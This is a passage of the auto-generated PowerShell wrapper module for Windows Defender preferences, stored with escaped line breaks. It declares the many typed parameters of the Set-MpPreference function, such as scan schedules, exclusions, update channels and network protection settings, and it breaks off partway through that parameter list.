"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'root\\Microsoft\\Windows\\Defender\\MSFT_MpPreference'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Set-MpPreference\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionPath},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionExtension},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionProcess},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionIpAddress},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rtsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Both','Incoming','Outcoming')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection]\r\n    ${RealTimeScanDirection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('qpiad')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${QuarantinePurgeItemsAfterDelay},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]\r\n    ${RemediationScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [datetime]\r\n    ${RemediationScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('repcs')]\r\n    [ValidateSet('NotConfigured','Block','Audit','Off')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState]\r\n    ${RemoteEncryptionProtectionConfiguredState},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('repmbt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${RemoteEncryptionProtectionMaxBlockTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('repa')]\r\n    [ValidateSet('Low','Medium','High')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness]\r\n    ${RemoteEncryptionProtectionAggressiveness},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('repe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${RemoteEncryptionProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('bfpcs')]\r\n    [ValidateSet('NotConfigured','Block','Audit','Off')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState]\r\n    ${BruteForceProtectionConfiguredState},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('bfpmbt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${BruteForceProtectionMaxBlockTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('bfpa')]\r\n    [ValidateSet('Low','Medium','High')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness]\r\n    ${BruteForceProtectionAggressiveness},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('bfpe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${BruteForceProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('raat')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ReportingAdditionalActionTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rcto')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ReportingCriticalFailureTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rncto')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ReportingNonCriticalTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('shri')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ServiceHealthReportInterval},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rdsde')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${ReportDynamicSignatureDroppedEvent},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('saclf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [byte]\r\n    ${ScanAvgCPULoadFactor},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('csbr')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${CheckForSignaturesBeforeRunningScan},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('spiad')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ScanPurgeItemsAfterDelay},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('soiie')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${ScanOnlyIfIdleEnabled},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('QuickScan','FullScan')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType]\r\n    ${ScanParameters},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('scsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]\r\n    ${ScanScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('scsqst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [datetime]\r\n    ${ScanScheduleQuickScanTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('scst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [datetime]\r\n    ${ScanScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('tfsso')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${ThrottleForScheduledScanOnly},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigfagp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SignatureFirstAuGracePeriod},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigagp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SignatureAuGracePeriod},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigdufss')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${SignatureDefinitionUpdateFileSharesSources},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigduoswo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${SignatureDisableUpdateOnStartupWithoutEngine},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sfo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${SignatureFallbackOrder},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ssp','SecurityIntelligenceLocation','ssl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${SharedSignaturesPath},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sspsch','SecurityIntelligenceLocationUpdateAtScheduledTimeOnly')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${SharedSignaturesPathUpdateAtScheduledTimeOnly},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]\r\n    ${SignatureScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [datetime]\r\n    ${SignatureScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('siguci')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SignatureUpdateCatchupInterval},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigui')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SignatureUpdateInterval},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigbui')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SignatureBlobUpdateInterval},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('sigbfs')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${SignatureBlobFileSharesSources},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('mcupd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${MeteredConnectionUpdates},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('anpws')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${AllowNetworkProtectionOnWinServer},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ddtgp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableDatagramProcessing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ecwtb')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${EnableConvertWarnToBlock},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableCpuThrottleOnIdleScans},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disabled','Basic','Advanced')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType]\r\n    ${MAPSReporting},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('AlwaysPrompt','SendSafeSamples','NeverSend','SendAllSamples')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType]\r\n    ${SubmitSamplesConsent},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dae')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableAutoExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dpm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisablePrivacyMode},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rstt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${RandomizeScheduleTaskTimes},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('srt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${SchedulerRandomizationTime},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dbm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableBehaviorMonitoring},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dips')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableIntrusionPreventionSystem},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dioavp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableIOAVProtection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('drtm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableRealtimeMonitoring},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dscrptsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableScriptScanning},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('darchsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableArchiveScanning},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dcfsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableCatchupFullScan},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dcqsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableCatchupQuickScan},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('demsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableEmailScanning},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('drdsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableRemovableDriveScanning},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('drp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableRestorePoint},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dsmndfsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableScanningMappedNetworkDrivesForFullScan},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dsnf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableScanningNetworkFiles},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('adsnftioav')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${ApplyDisableNetworkScanningToIOAV},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${UILockdown},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('tiddefaci')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [long[]]\r\n    ${ThreatIDDefaultAction_Ids},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('tiddefaca')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNull"
"OrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]\r\n    ${ThreatIDDefaultAction_Actions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('unktdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\r\n    ${UnknownThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ltdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\r\n    ${LowThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('mtdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\r\n    ${ModerateThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('htdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\r\n    ${HighThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('stdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\r\n    ${SevereThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [switch]\r\n    ${Force},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dbaf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableBlockAtFirstSeen},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disabled','Enabled','AuditMode')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType]\r\n    ${PUAProtection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Default','Moderate','High','HighPlus','ZeroTolerance')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType]\r\n    ${CloudBlockLevel},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('cloudextimeout')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${CloudExtendedTimeout},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disabled','Enabled','AuditMode')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType]\r\n    ${EnableNetworkProtection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disabled','Enabled','AuditMode','BlockDiskModificationOnly','AuditDiskModificationOnly')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType]\r\n    ${EnableControlledFolderAccess},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionOnlyExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessAllowedApplications},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessProtectedFolders},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionRules_Ids},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]\r\n    ${AttackSurfaceReductionRules_Actions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('elcp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${EnableLowCpuPriority},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('efhc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${EnableFileHashComputation},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('efsobp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${EnableFullScanOnBatteryPower},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ppurl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${ProxyPacUrl},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('proxsrv')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${ProxyServer},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('proxbps')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ProxyBypass},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('fupo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${ForceUseProxyOnly},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dtlsp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableTlsParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dftpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableFtpParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dhttpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableHttpParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ddnsp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableDnsParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ddnstcpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableDnsOverTcpParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dsshp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableSshParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('puc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('NotConfigured','Beta','Preview','Staged','Broad','Delayed')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]\r\n    ${PlatformUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('euc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('NotConfigured','Beta','Preview','Staged','Broad','Delayed')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]\r\n    ${EngineUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('duc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('NotConfigured','Staged','Broad','Delayed')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.DefinitionUpdatesChannelType]\r\n    ${DefinitionUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dgr')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableGradualRelease},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('anpdl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${AllowNetworkProtectionDownLevel},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('adpows')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${AllowDatagramProcessingOnWinServer},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('ednss')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${EnableDnsSinkhole},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dicf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableInboundConnectionFiltering},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('drdpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableRdpParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dnppt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableNetworkProtectionPerfTelemetry},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('tlps')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${TrustLabelProtectionStatus},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('astai')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${AllowSwitchToAsyncInspection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('scso')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${ScanScheduleOffset},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dtdtf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableTDTFeature},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dtp')]\r\n    [ValidateNotNull()]\r\n    